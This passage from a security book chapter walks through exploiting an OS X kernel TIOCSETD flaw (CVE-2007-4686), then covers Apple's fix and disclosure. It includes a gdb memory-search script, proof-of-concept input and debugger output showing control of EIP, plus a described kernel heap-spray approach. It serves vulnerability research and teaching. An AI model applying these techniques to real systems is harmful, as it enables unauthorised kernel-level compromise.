Value: 807ed63f</pre><p>If <code class="literal">0x10203040</code> pointed to the value I wanted copied into <code class="literal">EIP</code>, I had to supply the value <code class="literal">0x807ed63f</code> as an input for the <code class="literal">TIOCSETD</code> IOCTL.</p><p>I then tried to manipulate <code class="literal">EIP</code> to make it point to address <code class="literal">0x65656565</code>. To achieve this, I had to find a memory location in the kernel that pointed to that value. To find suitable memory locations in the kernel, I wrote the following gdb script:</p><div class="example"><a id="a_script_for_finding_memory_locations"/><p class="title">Example 7-4. A script for finding memory locations in the kernel that point to a special byte pattern (<span class="emphasis"><em>search_memloc.gdb</em></span>)</p><div class="example-contents"><pre class="programlisting">01    set $MAX_ADDR = 0x00600000
02
03    define my_ascii
04      if $argc != 1
05        printf "ERROR: my_ascii"
06      else
07        set $tmp = *(unsigned char *)($arg0)
08        if ($tmp &lt; 0x20 || $tmp &gt; 0x7E)
09          printf "."
10        else
11          printf "%c", $tmp
12        end
13      end
14    end
15
16    define my_hex
17      if $argc != 1
18        printf "ERROR: my_hex"
19      else
20        printf "%02X%02X%02X%02X ", \
21          *(unsigned char*)($arg0 + 3), *(unsigned char*)($arg0 + 2),     \
22          *(unsigned char*)($arg0 + 1), *(unsigned char*)($arg0 + 0)
23      end
24    end
25
26    define hexdump
27      if $argc != 2
28        printf "ERROR: hexdump"
29      else
30        if ((*(unsigned char*)($arg0 + 0) == (unsigned char)($arg1 &gt;&gt;  0)))
31          if ((*(unsigned char*)($arg0 + 1) == (unsigned char)($arg1 &gt;&gt;  8)))
32            if ((*(unsigned char*)($arg0 + 2) == (unsigned char)($arg1 &gt;&gt; 16)))
33              if ((*(unsigned char*)($arg0 + 3) == (unsigned char)($arg1 &gt;&gt; 24)))
34                printf "%08X : ", $arg0
35                my_hex $arg0
36                my_ascii $arg0+0x3
37                my_ascii $arg0+0x2
38                my_ascii $arg0+0x1
39                my_ascii $arg0+0x0
40                printf "\n"
41              end
42            end
43          end
44        end
45      end
46    end
47
48    define search_memloc
49      set $max_addr = $MAX_ADDR
50      set $counter = 0
51      if $argc != 2
52        help search_memloc
53      else
54        while (($arg0 + $counter) &lt;= $max_addr)
55          set $addr = $arg0 + $counter
56          hexdump $addr $arg1
57          set $counter = $counter + 0x20
58        end
59      end
60    end
61    document search_memloc
62    Search a kernel memory location that points to PATTERN.
63    Usage: search_memloc ADDRESS PATTERN
64    ADDRESS - address to start the search
65    PATTERN - pattern to search for
66    end</pre></div></div><p>The gdb script from <a class="xref" href="ch07s02.html#a_script_for_finding_memory_locations" title="Example 7-4. A script for finding memory locations in the kernel that point to a special byte pattern (search_memloc.gdb)">Example 7-4</a> takes two arguments: the address from where to start the search and the pattern to search for. I wanted to find a memory location that pointed to the value <code class="literal">0x65656565</code>, so I used the script in the following way:</p><a id="I_programlisting7_d1e8476"/><pre class="programlisting">(gdb) <strong class="userinput"><code>source search_memloc.gdb</code></strong>
(gdb) <strong class="userinput"><code>search_memloc 0x400000 0x65656565</code></strong>
0041BDA0 : 65656565 eeee
0041BDC0 : 65656565 eeee
0041BDE0 : 65656565 eeee
0041BE00 : 65656565 eeee
0041BE20 : 65656565 eeee
0041BE40 : 65656565 eeee
0041BE60 : 65656565 eeee
0041BE80 : 65656565 eeee
0041BEA0 : 65656565 eeee
0041BEC0 : 65656565 eeee
00459A00 : 65656565 eeee
00459A20 : 65656565 eeee
00459A40 : 65656565 eeee
00459A60 : 65656565 eeee
00459A80 : 65656565 eeee
00459AA0 : 65656565 eeee
00459AC0 : 65656565 eeee
00459AE0 : 65656565 eeee
00459B00 : 65656565 eeee
00459B20 : 65656565 eeee
Cannot access memory at address 0x4dc000</pre><p>The output shows the memory locations found by the script that point to the value <code class="literal">0x65656565</code>. I picked the first one from the list, adjusted the <code class="literal">MEMLOC</code> defined in line 3 of <a class="xref" href="ch07s02.html#code_that_i_wrote_to_brute_force_the" title="Example 7-3. Code that I wrote to brute force the TIOCSETD input data value (addr_brute_force.c)">Example 7-3</a>, and let the program determine the appropriate <code class="literal">TIOCSETD</code> input value:</p><a id="I_programlisting7_d1e8497"/><pre class="programlisting">osx$ <strong class="userinput"><code>head −3 addr_brute_force.c</code></strong>
#include &lt;stdio.h&gt;

#define MEMLOC    <strong class="userinput"><code>0x0041bda0</code></strong>

osx$ <strong class="userinput"><code>gcc -o addr_brute_force addr_brute_force.c</code></strong>

osx$ <strong class="userinput"><code>./addr_brute_force</code></strong>
Value: 87ffe2aa</pre><p>I then changed the IOCTL input value in the POC code illustrated in <a class="xref" href="ch07s02.html#poc_code_open_parenthesis-id1" title="Example 7-2. POC code (poc.c) I wrote to trigger the bug I found in the kernel of OS X">Example 7-2</a>, connected the kernel debugger to OS X, and executed the code:</p><a id="I_programlisting7_d1e8515"/><pre class="programlisting">osx$ <strong class="userinput"><code>head −6 poc.c</code></strong>
#include &lt;sys/ioctl.h&gt;

int
main (void)
{
      unsigned long     ldisc = <strong class="userinput"><code>0x87ffe2aa</code></strong>;

osx$ <strong class="userinput"><code>gcc -o poc poc.c</code></strong>

osx$ <strong class="userinput"><code>./poc</code></strong></pre><p>The OS X machine froze again, and the debugger on the Linux host displayed the following output:</p><a id="I_programlisting7_d1e8530"/><pre class="programlisting">Program received signal SIGTRAP, Trace/breakpoint trap.
<strong class="userinput"><code>0x65656565 in ?? ()</code></strong>

(gdb) <strong class="userinput"><code>info registers</code></strong>
eax            0xfffc5540       −240320
ecx            0x4000001        67108865
edx            0x386c380        59163520
ebx            0x87ffe2aa       −2013273430
esp            0x250dbc08       0x250dbc08
ebp            0x250dbd18       0x250dbd18
esi            0x3e59604        65377796
edi            0x0              0
<strong class="userinput"><code>eip            0x65656565       0x65656565</code></strong>
eflags         0x10282          66178
cs             0x8              8
ss             0x10             16
ds             0x3e50010        65339408
es             0x3e50010        65339408
fs             0x10             16
gs             0x48             72</pre><p>As the debugger output shows, the <code class="literal">EIP</code> register now had a value of <code class="literal">0x65656565</code>. At this point I was able to control <code class="literal">EIP</code>, but exploiting the bug to achieve arbitrary code execution at the kernel level was still a challenge. Under OS X, including Leopard, the kernel isn’t mapped into every user space process; it has its own virtual address space. It’s therefore impossible to return to a user space address using common strategies for Linux or Windows. I solved this problem by heap spraying the kernel with my privilege escalation payload and a reference to this payload. I achieved this by exploiting a memory leak in the kernel of OS X. Then I calculated an appropriate <code class="literal">TIOCSETD</code> input value that pointed to the payload reference. This value was then copied into <code class="literal">EIP</code> and . . . bingo!<a id="IDX-CHP-7-0020" class="indexterm"/><a id="IDX-CHP-7-0021" class="indexterm"/><a id="IDX-CHP-7-0022" class="indexterm"/><a id="IDX-CHP-7-0023" class="indexterm"/><a id="IDX-CHP-7-0024" class="indexterm"/></p><p>Providing you with a full working exploit would be against the law, but if you are interested, you can watch a short video I recorded that shows the exploit in action on the book’s website.<sup>[<a href="ch07s05.html#ftn.CHP-7-FN-4" class="footnoteref">78</a>]</sup></p></div></div>
<div class="sect1" title="7.3 Vulnerability Remediation"><div class="titlepage"><div><div><h1 class="title"><a id="vulnerability_remediation-id5"/>7.3 Vulnerability Remediation</h1></div></div></div><div class="note" title="Note"><h3 class="title">Note</h3><p><span class="emphasis"><em>Wednesday, November 14, 2007</em></span></p></div><p>After I informed Apple about the bug, Apple fixed it by adding an extra check for the user-supplied IOCTL data.</p><div class="variablelist"><dl><dt><span class="term"><span class="strong"><strong>Source code file</strong></span></span></dt><dd><p><span class="emphasis"><em>xnu-792.24.17/bsd/kern/tty.c</em></span><sup>[<a href="ch07s05.html#ftn.CHP-7-FN-5" class="footnoteref">79</a>]</sup></p></dd></dl></div><a id="I_programlisting7_d1e8598"/><pre class="programlisting">[..]
1081       case TIOCSETD: {        /* set line discipline */
1082           register int t = *(int *)data;
1083           dev_t device = tp-&gt;t_dev;
1084
<strong class="userinput"><code>1085           if (t &gt;= nlinesw || t &lt; 0)</code></strong>
1086               return (ENXIO);
1087           if (t != tp-&gt;t_line) {
1088               s = spltty();
1089               (*linesw[tp-&gt;t_line].l_close)(tp, flag);
1090               error = (*linesw[t].l_open)(device, tp);
1091               if (error) {
1092                   (void)(*linesw[tp-&gt;t_line].l_open)(device, tp);
1093                   splx(s);
1094                   return (error);
1095               }
1096               tp-&gt;t_line = t;
1097               splx(s);
1098           }
1099           break;
1100       }
[..]</pre><p>Line 1085 now checks whether the value of <code class="literal">t</code> is negative. If so, the user-derived data will not be processed any further. This little change was enough to successfully rectify the vulnerability.</p></div>
<div class="sect1" title="7.4 Lessons Learned"><div class="titlepage"><div><div><h1 class="title"><a id="lessons_learned-id5"/>7.4 Lessons Learned</h1></div></div></div><p>As a programmer:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem"><p>Avoid, where possible, using explicit type conversions (casts).</p></li><li class="listitem"><p>Always validate input data.</p></li></ul></div></div>
<div class="sect1" title="7.5 Addendum"><div class="titlepage"><div><div><h1 class="title"><a id="addendum-id5"/>7.5 Addendum</h1></div></div></div><div class="note" title="Note"><h3 class="title">Note</h3><p><span class="emphasis"><em>Thursday, November 15, 2007</em></span></p></div><p>Since the vulnerability has been fixed and a new version of the XNU kernel of OS X is available, I released a detailed security advisory on my website today.<sup>[<a href="ch07s05.html#ftn.CHP-7-FN-6" class="footnoteref">80</a>]</sup> The bug was assigned CVE-2007-4686.<a id="IDX-CHP-7-0025" class="indexterm"/></p><p>After I published the advisory, Theo de Raadt (the founder of OpenBSD and OpenSSH) hinted that this bug is older than 4.4BSD and was fixed roughly 15 years ago by everyone but Apple. In the initial revision of FreeBSD from 1994, the implementation of the <code class="literal">TIOCSETD</code> IOCTL looks like this:<sup>[<a href="ch07s05.html#ftn.CHP-7-FN-7" class="footnoteref">81</a>]</sup><a id="IDX-CHP-7-0026" class="indexterm"/><a id="IDX-CHP-7-0027" class="indexterm"/></p><a id="I_programlisting7_d1e8648"/><pre class="programlisting">[..]
804       case TIOCSETD: {        /* set line discipline */
805           register int t = *(int *)data;
806           dev_t device = tp-&gt;t_dev;
807
<strong class="userinput"><code>808           if ((u_int)t &gt;= nlinesw)</code></strong>
<strong class="userinput"><code>809               return (ENXIO);</code></strong>
810           if (t != tp-&gt;t_line) {
811               s = spltty();
812               (*linesw[tp-&gt;t_line].l_close)(tp, flag);
813               error = (*linesw[t].l_open)(device, tp);
814               if (error) {
815                   (void)(*linesw[tp-&gt;t_line].l_open)(device, tp);
816                   splx(s);
817                   return (error);
818               }
819               tp-&gt;t_line = t;
820               splx(s);
821           }
822           break;
823       }
[..]</pre><p>Since <code class="literal">t</code> gets cast into an unsigned int in line 808, it can never become negative. If the user-derived data is greater than <code class="literal">0x80000000</code>, the function returns with an error (see line 809). So Theo was right—the bug was indeed already fixed in 1994. <a class="xref" href="ch07s05.html#timeline_from_the_time_i_notified_apple" title="Figure 7-4. Timeline from the time I notified Apple until I released a security advisory">Figure 7-4</a> shows the timeline of the bug’s fix.</p><div class="figure"><a id="timeline_from_the_time_i_notified_apple"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject7_d1e8669"/><img src="httpatomoreillycomsourcenostarchimages939329.png.jpg" alt="Timeline from the time I notified Apple until I released a security advisory"/></div></div><p class="title">Figure 7-4. Timeline from the time I notified Apple until I released a security advisory</p></div><div class="sect2" title="Notes"><div class="titlepage"><div><div><h2 class="title"><a id="notes-id6"/>Notes</h2></div></div></div><p><sup>[<a id="CHP-7-FN-1" href="#ftn.CHP-7-FN-1" class="footnote">75</a>]</sup><a id="IDX-CHP-7-0028" class="indexterm"/></p><p><sup>[<a id="CHP-7-FN-2" href="#ftn.CHP-7-FN-2" class="footnote">76</a>]</sup></p><p><sup>[<a id="CHP-7-FN-3" href="#ftn.CHP-7-FN-3" class="footnote">77</a>]</sup></p><p><sup>[<a id="CHP-7-FN-4" href="#ftn.CHP-7-FN-4" class="footnote">78</a>]</sup></p><p><sup>[<a id="CHP-7-FN-5" href="#ftn.CHP-7-FN-5" class="footnote">79</a>]</sup></p><p><sup>[<a id="CHP-7-FN-6" href="#ftn.CHP-7-FN-6" class="footnote">80</a>]</sup><a id="IDX-CHP-7-0029" class="indexterm"/></p><p><sup>[<a id="CHP-7-FN-7" href="#ftn.CHP-7-FN-7" class="footnote">81</a>]</sup></p></div><div class="footnotes"><br/><hr/><div class="footnote"><p><sup>[<a id="ftn.CHP-7-FN-1" href="#CHP-7-FN-1" class="para">75</a>] </sup>The vulnerable source code revision 792.13.8 of XNU can be downloaded at <a class="ulink" href="http://www.opensource.apple.com/tarballs/xnu/xnu-792.13.8.tar.gz">http://www.opensource.apple.com/tarballs/xnu/xnu-792.13.8.tar.gz</a>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-7-FN-2" href="#CHP-7-FN-2" class="para">76</a>] </sup>See “‘You need to restart your computer’ (kernel panic) message appears (Mac OS X v10.5, 10.6)” at <a class="ulink" href="http://support.apple.com/kb/TS3742">http://support.apple.com/kb/TS3742</a>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-7-FN-3" href="#CHP-7-FN-3" class="para">77</a>] </sup>See “Kernel Extension Programming Topics: Debugging a Kernel Extension with GDB” in <span class="emphasis"><em>Mac OS X Developer Library</em></span> at <a class="ulink" href="http://developer.apple.com/library/mac/#documentation/Darwin/Conceptual/KEXTConcept/KEXTConceptDebugger/debug_tutorial.html">http://developer.apple.com/library/mac/#documentation/Darwin/Conceptual/KEXTConcept/KEXTConceptDebugger/debug_tutorial.html</a> and “Kernel Programming Guide: When Things Go Wrong; Debugging the Kernel” in <span class="emphasis"><em>Mac OS X Developer Library</em></span> at <a class="ulink" href="http://developer.apple.com/library/mac/documentation/Darwin/Conceptual/KernelProgramming/build/build.html#//apple_ref/doc/uid/TP30000905-CH221-CIHBJCGC">http://developer.apple.com/library/mac/documentation/Darwin/Conceptual/KernelProgramming/build/build.html#//apple_ref/doc/uid/TP30000905-CH221-CIHBJCGC</a>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-7-FN-4" href="#CHP-7-FN-4" class="para">78</a>] </sup>See <a class="ulink" href="http://www.trapkit.de/books/bhd/">http://www.trapkit.de/books/bhd/</a>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-7-FN-5" href="#CHP-7-FN-5" class="para">79</a>] </sup>The source code of the fixed XNU version 792.24.17 is available at <a class="ulink" href="http://www.opensource.apple.com/tarballs/xnu/xnu-792.24.17.tar.gz">http://www.opensource.apple.com/tarballs/xnu/xnu-792.24.17.tar.gz</a>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-7-FN-6" href="#CHP-7-FN-6" class="para">80</a>] </sup>My security advisory that describes the details of the Mac OS X kernel vulnerability can be found at <a class="ulink" href="http://www.trapkit.de/advisories/TKADV2007-001.txt">http://www.trapkit.de/advisories/TKADV2007-001.txt</a>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-7-FN-7" href="#CHP-7-FN-7" class="para">81</a>] </sup>The initial FreeBSD version of <span class="emphasis"><em>tty.c</em></span> from 1994 can be found at <a class="ulink" href="http://www.freebsd.org/cgi/cvsweb.cgi/src/sys/kern/tty.c?rev=1.1;content-type=text/plain">http://www.freebsd.org/cgi/cvsweb.cgi/src/sys/kern/tty.c?rev=1.1;content-type=text/plain</a>.</p></div></div></div></body></html>